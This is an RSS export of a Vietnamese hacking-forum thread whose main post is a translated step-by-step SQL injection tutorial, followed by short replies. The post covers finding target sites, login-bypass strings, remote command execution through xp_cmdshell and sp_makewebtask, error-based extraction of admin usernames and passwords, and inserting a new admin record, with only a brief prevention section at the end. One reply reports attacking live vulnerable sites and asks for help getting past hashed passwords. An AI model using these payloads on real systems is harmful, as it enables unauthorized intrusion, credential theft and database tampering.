<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Tìm hiểu về SQL Injection"]]></title>
		<link>/hvaonline/posts/list/12.html</link>
		<description><![CDATA[Latest messages posted in the topic "Tìm hiểu về SQL Injection"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ Mục lục:

<font color='violet'>1. SQL Injection là gì? 
2. Tìm kiếm mục tiêu 
3. K iểm tra chỗ yếu của trang web 
4. Tại sao ' or 1=1-- có thể bypass login? 
5. Thi hành lệnh từ xa bằng SQL Injection 
6.Nhận output của SQL query 
7. Nhận data qua 'database using ODBC error message' 
8. Xác định tên của các column trong table 
9. Thu thập các dữ liệu quan trọng 
10. Nhận các numeric string 
11. Update/insert data vào CSDL 
12. Ngăn chặn SQL Injection 
13. Tài liệu thao khảo</font>


<font color='violet'>1) SQL Injection là gì?</font>

SQL Injection là một trong những kiểu hack web đang dần trở nên phổ biến hiện nay. Bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username và password, remote execution, dump data và lấy root của SQL server. Công cụ dùng để tấn công là một trình duyệt web bất kì, chẳng hạn như Internet Explorer, Netscape, Lynx, ...

<font color='violet'>2) Tìm kiếm mục tiêu</font>

Bạn có thể search các trang web cho phép submit data ở bất kì một search-engine nào trên mạng, chẳng hạn như các trang login, search, feedback, ...
<span class="link"> http://vịtcon/index.asp?id=10</span>

Một số trang web chuyển tham số qua các field ẩn, bạn phải xem mã HTML mới thấy rõ.

<FORM action=Search/search.asp method=post>
<input type=hidden name=A value=C>
</FORM>
<font color='violet'>
3) Kiểm tra chỗ yếu của trang web</font>

Thử submit các field username, password hoặc field id, .. bằng hi' or 1=1--

- Login: hi' or 1=1--
- Pass: hi' or 1=1--
-<span class="link"> http://vịtcon/index.asp?id=hi'</span> or 1=1--

Nếu site chuyển tham số qua field ẩn, bạn hãy download source HTML, lưu trên đĩa cứng và thay đổi lại URL cho phù hợp. Ví dụ:

<FORM action=http://vịtcon/Search/search.asp method=post>
<input type=hidden name=A value="hi' or 1=1--">
</FORM>

Nếu thành công, bạn có thể login vào mà không cần phải biết username và password

<font color='violet'>4) Tại sao ' or 1=1-- có thể bypass login?</font>

Giả sử như có một trang asp link đến một asp trang khác với URL như sau:
<span class="link"> http://vịtcon/index.asp?category=food</span>

Trong URL trên, biến 'category' được gán giá trị là 'food'. Mã asp của trang này có thể như sau (đây chỉ là ví dụ thôi):

v_cat = request("category")
sqlstr="SELECT * FROM product WHERE PCategory='" & v_cat & "'"
set rs=conn.execute(sqlstr)

v_cat sẽ chứa giá trị của biến request.category, 'food' và câu lệnh SQL tiếp theo sẽ là:

SELECT * FROM product WHERE PCategory='food'

Dòng query trên sẽ trả về một tập resultset chứa một hoặc nhiều dòng phù hợp với điều kiện WHERE PCategory='food'

Nếu bạn thay đổi URL trên thành<span class="link"> http://vịtcon/index.asp?category=food'</span> or 1=1-- , biến v_cat sẽ chứa giá trị "food' or 1=1-- " và dòng lệnh SQL query sẽ là:

SELECT * FROM product WHERE PCategory='food' or 1=1--'

Dòng query trên sẽ select mọi thứ trong table product bất chấp PCategory có bằng 'food' hay không. Hai dấu gạch ngang "--" chỉ cho MS SQL server biết đã hết dòng query, mọi thứ còn lại sau "--" sẽ bị bỏ qua. Đối với MySQL, bạn hãy thay "--" thành "#"

Bạn cũng có thể thử cách khác bằng cách submit ' or 'a'='a. Dòng SQL query bây giờ sẽ là:

SELECT * FROM product WHERE PCategory='food' or 'a'='a'

Một số data khác mà bạn cũng nên submit để biết xem trang web có gặp lỗi hay không:

' or 1=1--
" or 1=1--
or 1=1--
' or 'a'='a
" or "a"="a
') or ('a'='a

<font color='violet'>5) Thi hành lệnh từ xa bằng SQL Injection</font>

Nếu cài đặt với chế độ default, MS SQL Server sẽ chạy ở mức SYSTEM, tương đương với mức truy cập Administrator trên Windows. Bạn có thể dùng master..xp_cmdshell để thi hành lệnh từ xa:

'; exec master..xp_cmdshell 'ping 10.10.1.2'--

Hãy thử dùng dấu nháy đôi (") nếu dấu nháy đơn (') không làm việc.

Dấu chấm phẩy ( ; ) sẽ kết thúc dòng SQL query hiện tại và cho phép bạn thi hành một SQL command mới. Để kiểm tra xem lệnh trên có được thi hành hay không, bạn có thể listen các ICMP packet from 10.10.1.2 bằng tcpdump như sau:

#tcpdump icmp

Nếu nhận được ping request từ 10.10.1.2 nghĩa là lệnh đã được thi hành.

<font color='violet'>6) Nhận output của SQL query</font>

Bạn có thể dùng sp_makewebtask để ghi các output của SQL query ra một file HTML

'; EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"

folder "share" phải được share cho Everyone trước.
<font color='violet'>
7) Nhận data qua 'database using ODBC error message'</font>

Các error message của MS SQL Server thường đưa cho bạn những thông tin quan trọng. Lấy ví dụ ở trên<span class="link"> http://vịtcon/index.asp?id=10,</span> bây giờ chúng ta thử hợp nhất integer '10' với một string khác lấy từ CSDL:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-- 

System table INFORMATION_SCHEMA.TABLES chứa thông tin về tất cả các table có trên server. Field TABLE_NAME chứa tên của mỗi table trong CSDL. Chúng ta chọn nó bởi vì chúng ta biết rằng nó luôn tồn tại. Query của chúng ta là:

SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-

Dòng query này sẽ trả về tên của table đầu tiên trong CSDL

Khi chúng ta UNION string này với số integer 10, MS SQL Server sẽ cố thử chuyển một string (nvarchar) thành một số integer. Điều này sẽ gặp lỗi nếu như không chuyển được nvarchar sang int, server sẽ hiện thông báo lỗi sau:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'table1' to a column of data type int. 
/index.asp, line 5

Thông báo lỗi trên cho biết giá trị muốn chuyển sang integer nhưng không được, "table1". Đây cũng chính là tên của table đầu tiên trong CSDL mà chúng ta đang muốn có.

Để lấy tên của tên của table tiếp theo, bạn có thể dùng query sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--

Bạn cũng có thể search data bằng từ khóa LIKE:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25login%25'--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'admin_login' to a column of data type int. 
/index.asp, line 5

Mẫu so sánh '%25login%25' sẽ tương đương với %login% trong SQL Server. Như bạn thấy trong error message trên, chúng ta có thể xác định được tên của một table quan trọng là "admin_login".

<font color='violet'>8 ) Xác định tên của các column trong table</font>

Table INFORMATION_SCHEMA.COLUMNS chứa tên của tất cả các column trong table. Bạn có thể khai thác như sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_id' to a column of data type int. 
/index.asp, line 5

Như vậy tên của column đầu tiên là "login_id". Để lấy tên của các column tiếp theo, bạn có thể dùng mệnh đề logic NOT IN () như sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id')--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_name' to a column of data type int. 
/index.asp, line 5

Làm tương tự như trên, bạn có thể lấy được tên của các column còn lại như "password", "details". Bạn lấy tên của các column này qua error message error sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id','login_name','password',details')--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
[Microsoft][ODBC SQL Server Driver][SQL Server]ORDER BY items must appear in the select list if the statement contains a UNION operator. 
/index.asp, line 5

<font color='violet'>9) Thu thập các dữ liệu quan trọng</font>

Chúng ta đã xác định được các tên của các table và column quan trọng. Chúng ta sẽ thu thập các thông tin quan trọng từ các table và column này.

Bạn có thể lấy login_name đầu tiên trong table "admin_login" như sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 login_name FROM admin_login--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'neo' to a column of data type int. 
/index.asp, line 5

Bạn dễ dàng nhận ra được admin user đầu tiên có login_name là "neo". Hãy thử lấy password của "neo" như sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--

Output:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'm4trix' to a column of data type int. 
/index.asp, line 5

Bây giờ bạn có thể login vào với username là "neo" và password là "m4trix".

<font color='violet'>10) Nhận các numeric string</font>

Có một hạn chế nhỏ đối với phương pháp trên. Chúng ta không thể nhận được các error message nếu server có thể chuyển text đúng ở dạng số (text chỉ chứa các kí tự số từ 0 đến 9). Giả sử như password của "trinity" là "31173".
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--

Bạn chỉ nhận được thông báo lỗi "Page Not Found". Lí do bởi vì server có thể chuyển passoword "31173" sang dạng số trước khi UNION với integer 10. Để giải quyết vấn đề này, chúng ta có thể thêm một vài kí tự alphabet vào numeric string này để làm thất bại sự chuyển đổi từ text sang số của server. Dòng query mới như sau:
<span class="link"> http://vịtcon/index.asp?id=10</span> UNION SELECT TOP 1 convert(int, password%2b'%20morpheus') FROM admin_login where login_name='trinity'--

Chúng ta dùng dấu cộng (+) để nối thêm text vào password (ASSCII code của '+' là 0x2b). Chúng ta thêm chuỗi '(space)morpheus' vào cuối password để tạo ra một string mới không phải numeric string là '31173 morpheus'. Khi hàm convert() được gọi để chuyển '31173 morpheus' sang integer, SQL server sẽ phát lỗi ODBC error message sau:

Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value '31173 morpheus' to a column of data type int. 
/index.asp, line 5

Bây giờ bạn cũng có thể login vào với username 'trinity' và password là '31173'
<font color='violet'>
11) Update/insert data vào CSDL</font>

Khi bạn đã có tên của tất cả các column trong table, bạn có thể UPDATE hoặc INSERT một record mới vào table này.

Để thay đổi password của "neo", bạn có thể làm như sau:
<span class="link"> http://vịtcon/index.asp?id=10;</span> UPDATE 'admin_login' SET 'password' = 'newpas5' WHERE login_name='neo'--

Hoặc nếu bạn muốn chèn một record mới vào table:
<span class="link"> http://vịtcon/index.asp?id=10;</span> INSERT INTO 'admin_login' ('login_id', 'login_name', 'password', 'details') VALUES (666,'neo2','newpas5','NA')--

Bây giờ bạn có thể login vào với username "neo2" và password là "newpas5"

<font color='violet'>12) Ngăn chặn SQL Injection</font>

Hãy loại bỏ các kí tự meta như '"/\; và các kí tự extend như NULL, CR, LF, ... trong các string nhận được từ:

- input do người dùng đệ trình
- các tham số từ URL
- các giá trị từ cookie

Đối với các giá trị numeric, hãy chuyển nó sang integer trước khi query SQL, hoặc dùng ISNUMERIC để chắc chắn nó là một số integer.

Thay đổi "Startup and run SQL Server" dùng mức low privilege user trong tab SQL Server Security.

Xóa các stored procedure mà bạn không dùng như:

master..Xp_cmdshell, xp_startmail, xp_sendmail, sp_makewebtask

<font color='violet'>13) Tài liệu thao khảo</font>

- How I hacked PacketStorm (Rain Forest Puppy)<span class="link"> http://www.wiretrip.net/rfp/p/doc.asp?id=42&iface=6</span>
- Great article on gathering information from ODBC error messages<span class="link"> http://www.blackhat.com/presentations/win-usa-01/Litchfield/BHWin01Litchfield.doc</span>
- A good summary of SQL Injection on various SQL Server on<span class="link"> http://www.owasp.org/asac/input_validation/sql.shtml</span>
- Senseport's article on reading SQL Injection<span class="link"> http://www.sensepost.com/misc/SQLinsertion.htm</span>
- Khác:<span class="link"> http://www.digitaloffense.net/wargames01/IOWargames.ppt,</span><span class="link"> http://www.wiretrip.net/rfp/p/doc.asp?id=7&iface=6,</span><span class="link"> http://www.wiretrip.net/rfp/p/doc.asp?id=60&iface=6,</span><span class="link"> http://www.spidynamics.com/whitepapers/WhitepaperSQLInjection.pdf</span>

* Bài viết này được dịch và sửa đổi từ bài viết "SQL Injection Walkthrough" của xfocus.net. Hy vọng bạn có thể nắm bắt được các vấn đề mà mình đã trình bày ở trên. 

- Vicki - ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#560</guid>
				<link>/hvaonline/posts/list/163.html#560</link>
				<pubDate><![CDATA[Tue, 20 Jun 2006 06:29:00]]> GMT</pubDate>
				<author><![CDATA[ Mulan]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ Bác nên ghi copyright chứ. Nếu mình nhớ không lầm thì bài này bên dot.net.vn thì phải :P]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#908</guid>
				<link>/hvaonline/posts/list/163.html#908</link>
				<pubDate><![CDATA[Sun, 25 Jun 2006 22:46:44]]> GMT</pubDate>
				<author><![CDATA[ BigballVN]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ Đã có 2 dòng cuối ghi xuất xứ, bạn xem lại nhé.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#909</guid>
				<link>/hvaonline/posts/list/163.html#909</link>
				<pubDate><![CDATA[Sun, 25 Jun 2006 22:47:25]]> GMT</pubDate>
				<author><![CDATA[ caothuvolam]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ anh mulan có thể cho em yahoo không? em có một số vần đề cần hỏi anh,rất mọng dc sự giúp đở của anh
EM đang làm đồ án về mssql và mysql]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#222644</guid>
				<link>/hvaonline/posts/list/163.html#222644</link>
				<pubDate><![CDATA[Mon, 11 Oct 2010 20:01:00]]> GMT</pubDate>
				<author><![CDATA[ kyyu]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">kyyu wrote:</cite><br>
		<blockquote>anh mulan có thể cho em yahoo không? em có một số vần đề cần hỏi anh,rất mọng dc sự giúp đở của anh
EM đang làm đồ án về mssql và mysql&nbsp;
		</blockquote>
Anh Mulan không có làm IT. =))  =)) ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#222671</guid>
				<link>/hvaonline/posts/list/163.html#222671</link>
				<pubDate><![CDATA[Tue, 12 Oct 2010 02:06:23]]> GMT</pubDate>
				<author><![CDATA[ louisnguyen27]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ Cho mình hỏi là thường khi khai thác hay thêm vào --sp_password. Vậy sp_password có tác dụng gì, vì sau dấu -- thì thành chú thích, mà vẫn thêm vào sp_password với mục đích gì.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#222690</guid>
				<link>/hvaonline/posts/list/163.html#222690</link>
				<pubDate><![CDATA[Tue, 12 Oct 2010 07:51:09]]> GMT</pubDate>
				<author><![CDATA[ laptrinhga]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ làm cái tut cho dễ nhìn đc ko anh. :d]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#223372</guid>
				<link>/hvaonline/posts/list/163.html#223372</link>
				<pubDate><![CDATA[Thu, 21 Oct 2010 22:00:54]]> GMT</pubDate>
				<author><![CDATA[ llvllr_bin]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ Đúng là vỡ lòng ...]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#223969</guid>
				<link>/hvaonline/posts/list/163.html#223969</link>
				<pubDate><![CDATA[Sat, 30 Oct 2010 03:17:13]]> GMT</pubDate>
				<author><![CDATA[ Iriz]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ bài viết 5 năm rồi giờ vẫn còn giá trị nguyên vẹn.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#223975</guid>
				<link>/hvaonline/posts/list/163.html#223975</link>
				<pubDate><![CDATA[Sat, 30 Oct 2010 05:59:06]]> GMT</pubDate>
				<author><![CDATA[ B 0 0 B]]></author>
			</item>
			<item>
				<title>Tìm hiểu về SQL Injection</title>
				<description><![CDATA[ Xin chào!
Mình đã mới tìm hiểu về sql injection, đã tìm ra 1 số trang có lỗi và cũng đã test thành công nhưng có 1 số trang pass bị mã hoá MD5, mình đã đọc bài này rất kỹ và đã INSERT và UPDATE pass theo đúng cú pháp mà vẫn không được. Mong các cao thủ chỉ giáo. Cảm ơn rất nhiều!]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/163.html#243786</guid>
				<link>/hvaonline/posts/list/163.html#243786</link>
				<pubDate><![CDATA[Tue, 19 Jul 2011 04:16:06]]> GMT</pubDate>
				<author><![CDATA[ tinhban1105]]></author>
			</item>
	</channel>
</rss>
